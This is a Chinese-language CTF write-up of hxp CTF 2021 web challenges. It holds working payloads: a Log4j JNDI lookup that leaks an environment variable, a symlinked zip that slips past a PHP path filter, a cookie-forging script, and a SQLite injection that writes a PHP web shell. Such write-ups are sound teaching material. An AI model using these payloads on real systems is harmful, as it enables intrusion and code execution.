---
title: "hxpCTF2021 Wp"
slug: "hxpctf2021-wp"
description: "太菜了，纯复现流做题"
date: 2021-12-20T23:45:08+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

https://2021.ctf.link/internal/challenges

## Log 4 sanity check

> [ALARM ALARM](https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.pdf?__blob=publicationFile&v=6)
>
> nc 65.108.176.77 1337

看到log4j的第一反应是拿JNDI那个工具直接梭，但是发现弹不出来shell（不管是bash nc还是curl wget这些 尝试了发现都不行），但是显然需要一个rce或者是文件读取的点，再仔细看dockerfile发现flag已经被读到环境变量中了

![image-20211220003006386](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220003006386.png)

唔，所以直接读一下本地环境变量中的flag

```
${jndi:ldap://127.0.0.1/${env:FLAG}}
```

![image-20211220002554929](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220002554929.png)

`hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}`

## unzipper

> Here, let me unzip that for you.
>
> http://65.108.176.76:8200/

index.php

```php
<?php
session_start() or die('session_start');

$_SESSION['sandbox'] ??= bin2hex(random_bytes(16));
$sandbox = 'data/' . $_SESSION['sandbox'];
$lock = fopen($sandbox . '.lock', 'w') or die('fopen');
flock($lock, LOCK_EX | LOCK_NB) or die('flock');

@mkdir($sandbox, 0700);
chdir($sandbox) or die('chdir');

if (isset($_FILES['file']))
    system('ulimit -v 8192 && /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . ' . escapeshellarg($_FILES['file']['tmp_name']));
else if (isset($_GET['file']))
    if (0 === preg_match('/(^$|flag)/i', realpath($_GET['file']) ?: ''))
        readfile($_GET['file']);

fclose($lock);

```

看到zip想到肯定跟软链接读文件有关（但是这种姿势没有见过，学到了

这里实现了两个功能，首先是unzip POST上传的zip文件，另一个是对GET的file参数进行文件读取，并且对参数进行了`realpath()`的处理，它会解析软链接的路径，并且有一个正则匹配要求不能有flag（大小写不敏感），之后可以通过`readfile()`读文件，参数是不经过滤的file

`readfile`有一个特性是接受url路径的参数，比如`file:///flag.txt`，会将其视作url去读取`/flag.txt`，而`realpath`会将其视作`file:`文件夹下的`flag.txt`文件

我们可以制作一个指向`file:`文件夹中的xyz（任意文件）的名为`flag.txt`的软链接，它在`realpath`时被扩展为`...../file:/xyz` 可以通过if比较，而在`readfile`中则会按照url的方式进行解析（跟什么软链接就没关系了），读取根目录下的flag.txt

```bash
mkdir file:
cd file:
touch amiz.txt
ln -s amiz.txt flag.txt
cd ..
zip -ry tttttemp.zip file:
```

![image-20211220105743255](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220105743255.png)

![image-20211220105724345](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220105724345.png)

`hxp{at_least_we_have_all_the_performance_in_the_world..._lolphp_:/}`

参考：[wp](https://mikecat.github.io/ctf-writeups/2021/20211218_hxp_CTF_2021/WEB/unzipper/#en)

## shitty blog

> Please use my shitty blog 🤎!
>
> http://65.108.176.96:8888/

```php+HTML
<?php
// TODO: fully implement multi-user / guest feature :(

$secret = 'SECRET_PLACEHOLDER';
$salt = '$6$'.substr(hash_hmac('md5', $_SERVER['REMOTE_ADDR'], $secret), 16).'$';

if(! isset($_COOKIE['session'])){
    $id = random_int(1, PHP_INT_MAX);
    $mac = substr(crypt(hash_hmac('md5', $id, $secret, true), $salt), 20);
}
else {
    $session = explode('|', $_COOKIE['session']);
    if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) {
        exit();
    }
    $id = $session[0];
    $mac = $session[1];
}
setcookie('session', $id.'|'.$mac);
$sandbox = './data/'.md5($salt.'|'.$id.'|'.$mac);
if(! is_dir($sandbox)) {
    mkdir($sandbox);
}

$db = new PDO('sqlite:'.realpath($sandbox).'/blog.sqlite3');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);

$schema = "
    CREATE TABLE IF NOT EXISTS user (id INTEGER PRIMARY KEY, name VARCHAR(255));
    CREATE TABLE IF NOT EXISTS entry (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, content TEXT);

    INSERT OR IGNORE INTO user (id, name) VALUES (0, 'System');
    INSERT OR IGNORE INTO entry (id, user_id, content) VALUES (0, 0, 'Welcome to your new blog - 🚩🚩🚩 ʕ•́ᴥ•̀ʔっ🤎 🚩🚩🚩');
";
$db->exec($schema);

function get_entries($db){
    $sth = $db->query('SELECT id, user_id, content FROM entry ORDER BY id DESC');
     return $sth->fetchAll();
}

function get_user($db, $user_id) : string {
    foreach($db->query("SELECT name FROM user WHERE id = {$user_id}") as $user) {
        return $user['name'];
    }
    return 'me';
}

function insert_entry($db, $content, $user_id) {
    $sth = $db->prepare('INSERT INTO entry (content, user_id) VALUES (?, ?)');
    $sth->execute([$content, $user_id]);
}

function delete_entry($db, $entry_id, $user_id) {
    $db->exec("DELETE from entry WHERE {$user_id} <> 0 AND id = {$entry_id}");
}

if(isset($_POST['content'])) {
    insert_entry($db, htmlspecialchars($_POST['content']), $id);

    header('Location: /');
    exit;
}

$entries = get_entries($db);

if(isset($_POST['delete'])) {
    foreach($entries as $key => $entry) {
        if($_POST['delete'] === $entry['id']){
            delete_entry($db, $entry['id'], $entry['user_id']);
            break;
        }
    }

    header('Location: /');
    exit;
}

foreach($entries as $key => $entry) {
    $entries[$key]['user'] = get_user($db, $entry['user_id']);
}

?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>My shitty Blog</title>
    <link rel="icon" type="image/png" href="/favicon.png"/>
  </head>
  <body>
    <h1>My shitty blog</h1>
    <form method="post">
        <textarea cols="50" rows="10" name="content"></textarea>
        <input type="submit" value="Post">
    </form>
    <?php foreach($entries as $entry):?>
        <div>
            <p><?= $entry['content'] ?></p>
            <small>By <?=  $entry['user'] ?> </small>
            <form method="post">
                <input type="hidden" name="delete" value="<?= $entry['id'] ?>">
                <input type="submit" value="Delete">
            </form>
        </div>
        <hr>
    <?php endforeach ?>

  </body>
</html>

```

使用sqlite做数据库，非模拟预处理，另外很坑爹的把每一次的请求的设置了`header('Location: /');`导致没有回显（导致虽然它开启了报错的选项 但是把常规的报错注入给毙掉了）

首先从几个数据库函数中找是否有可以注入的点，`get_entries`无输入值用不了，`insert_entry`用了prepare预处理

![image-20211220172155830](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220172155830.png)

剩下的`get_user`和`delete_entry`有明显的sql语句拼接（无过滤），尝试利用`delete_entry`的`$user_id`进行sql注入，而dockerfile中设置了flag.txt的权限，我们只能rce来执行/readflag，所以注入不是注数据而是应该注一个类似`<?php echo system('/readflag');?>`这样的shell进去（具体操作在后面

而这里的`$user_id`我们可以通过post再delete来通过session中的`$id`来控制，返回代码中康康session部分的内容

![image-20211220172430751](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220172430751.png)

是沙箱式的sqlite数据库，鉴权部分使用cookie+复杂的一堆加盐哈希函数

![image-20211220172500240](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220172500240.png)

为了通过

```php
hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])
```

的if校验，我们需要伪造一个合理的`session`值 类似`$id.'|'.$mac`这样

```php
$id = random_int(1, PHP_INT_MAX);
$mac = substr(crypt(hash_hmac('md5', $id, $secret, true), $salt), 20);
```

但是既不知道`secret`也不知道`salt`——于是比赛的时候就卡到了这里，但是实际上这里是可以突破的

注意`crypt()`的`true`参数，它会使输出值是raw binary data，也就是说发生这种现象

```php
$a = "aaaaaaa";
$b = "aaaaaaa\x00aaaaa";
echo crypt($a, '$2a$07$usesomesillystringforsalt$');
echo crypt($b, '$2a$07$usesomesillystringforsalt$');
```

![image-20211220174142440](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220174142440.png)

没错！是熟悉的配方——00截断，`\x00`之后的内容将被忽略，也就是说对任何`$id`md5之后以`\x00`开头的值进行`crypt()`之后得到的`$mac`是一样的！

现在需要确定这个`$id`值，显然本地和远程的`$secret`值不一样 无法本地直接伪造，我们的方法是大量的GET请求来获得大量的新cookie，观察`|`之后的部分的出现相同的频率，因为上述情况发生的概率是1/256，如果发生了两次 就可以确定是我们要找的`$mac`值

```python
import requests
from tqdm import tqdm

macs = []
for _ in tqdm(range(1000)):
    response = requests.get('http://65.108.176.96:8888/')
    macs.append(response.cookies['session'].split('%7C')[1])
mac_0 = max(macs, key=macs.count)
print(mac_0)
```

![image-20211220182703931](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220182703931.png)

有了合适的`$mac`之后再考虑如何通过sqli写shell，根据[cheat sheet](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet)整一个payload

```
1=1; ATTACH DATABASE '/var/www/html/data/qazxsw.php' as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES ('<?php echo system(\"/readflag\"); ?>'); -- xyz
```

看着很骚的写shell方式，之前做题没有见到过（这波学到了），这个payload就放入cookie的`$id`部分即可，带着cookie访问页面post再delete一条内容，再转到/data/qazxsw.php页面就可以看到flag了

```python
import requests
import random
import string
from urllib.parse import quote
remote_0_mac = 'FlDRLIZWMTqtYjAugBkToe66C3Q5PaXnGAyzGL6VpiCmfl%2FQjtvYr2QavlI9lmsrMbQnpPfIMr979D1E4bBa71'

cont = ''
payload = quote("1=1; ATTACH DATABASE '/var/www/html/data/qazxsw.php' as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES ('<?php echo system(\"/readflag\"); ?>'); -- xyz")
while 'html' not in cont:
    random_id = ''.join(random.choice(string.ascii_letters) for _ in range(10))
    cookies = {
        'session': payload + random_id + '%7C' + remote_0_mac
    }
    response = requests.get('http://65.108.176.96:8888/', cookies=cookies)
    cont = response.text
print(cookies)
```

![image-20211220182749173](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220182749173.png)

![image-20211220182536863](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220182536863.png)

`hxp{dynamically_typed_statically_typed_php_c_I_hate_you_all_equally__at_least_its_not_node_lol_:(}`

参考：[wp](https://wachter-space.de/2021/12/19/hxp_21)

## **counter

> Please check out our minimal view counter. I think it’s secure. Anyway please no hacks.
>
> http://49.12.232.139:8008/

```php
<?php
$rmf = function($file){
    system('rm -f -- '.escapeshellarg($file));  //
};

$page = $_GET['page'] ?? 'default';
chdir('./data');

if(isset($_GET['reset']) && preg_match('/^[a-zA-Z0-9]+$/', $page) === 1) {
    $rmf($page);
}

file_put_contents($page, file_get_contents($page) + 1);
include_once($page);

```

条件竞争包含

https://gist.github.com/parrot409/3919a4e6ab1eae76d051c5a4d4cfa737

## ***includer's revenge

> Just sitting here and waiting for PHP 8.1 (lolphp).
>
> http://65.108.176.254:8088/

不会，摆了
